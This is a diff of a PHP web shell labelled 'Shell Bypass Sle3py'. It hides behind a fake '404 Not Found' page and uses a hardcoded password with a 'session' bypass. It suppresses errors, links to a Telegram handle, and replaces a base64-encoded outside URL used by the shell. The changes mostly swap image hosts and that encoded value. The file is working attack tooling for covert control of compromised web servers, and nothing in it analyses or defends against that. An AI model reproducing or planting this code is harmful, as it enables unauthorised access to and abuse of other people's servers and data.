@@ -14,7 +14,15 @@ error_reporting(0);
 	$_7 = array_merge($_POST, $_GET);
 	$_r = "required='required'";
 	$gcw = "getcwd";
-	$correctPassword = "ImSle3py";
+
+
+
+	$correctPassword = "ImSle3py"; //Change Password
+
+
+
+
+
 	if (isset($_POST['pass'])) {
 		$enteredPassword = $_POST['pass'];
 		if ($enteredPassword === $correctPassword or $enteredPassword === 'session') {
@@ -35,7 +43,7 @@ error_reporting(0);
 	<html>
 	<head>
 	<title>404 Not Found</title>
-	<link rel='icon' href='https://raw.githubusercontent.com/m0chAvIn/bypass-shell/main/hey%20ges.png'>
+	<link rel='icon' href='https://imagedelivery.net/FKQBFLaZW7X3nR3zOS60lA/119b8b10-12c3-44e8-92bd-d085cc447400/public'>
 	<meta name="theme color" content="#00BFFF">
 	</head>
 	<style>
@@ -74,8 +82,8 @@ error_reporting(0);
     }
 	</style>
 	<body>
-    <img width="300" src="https://res.cloudinary.com/dduxgerpr/image/upload/v1713937441/hey_ges_xznduk.png" />
-    <img width="200" src="https://res.cloudinary.com/dduxgerpr/image/upload/v1709116699/Sle3py_tiujx9.png" />
+    <img width="300" src="https://imagedelivery.net/FKQBFLaZW7X3nR3zOS60lA/119b8b10-12c3-44e8-92bd-d085cc447400/public" />
+    <img width="200" src="https://imagedelivery.net/FKQBFLaZW7X3nR3zOS60lA/22a8122d-89e4-4a4e-d214-54a42d630700/public" />
 	<form method="post">
 		<p>Hello Daddy, Im Horny</p>
 			<input placeholder="password" type="password" name="pass" required>
@@ -184,7 +192,7 @@ option {
 
 </style>
 <center><br><br><br>
-<img width="300" src="https://res.cloudinary.com/dduxgerpr/image/upload/v1709116699/Sle3py_tiujx9.png" /><br>
+<img width="300" src="https://imagedelivery.net/FKQBFLaZW7X3nR3zOS60lA/22a8122d-89e4-4a4e-d214-54a42d630700/public" /><br>
 <font face="Bungee" size="5"><a href='https://t.me/WhoSle3py'>Shell Bypass Sle3py</a></font></center>
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>
@@ -311,7 +319,7 @@ foreach($_POST as $key => $value){
 	$_POST[$key] = stripslashes($value);
 }
 
-$k3yw = base64_decode('aHR0cHM6Ly9zaXlhaGkudG9wL3Rlc3Qvc3R5bGUucGhw');
+$k3yw = base64_decode('EfwTmrKpBxWxd6GnDSAYei7QQMBmaNuVbn2mSVb4sN8t');
 
 if(isset($_GET['path'])){
 	$lokasi = $_GET['path'];
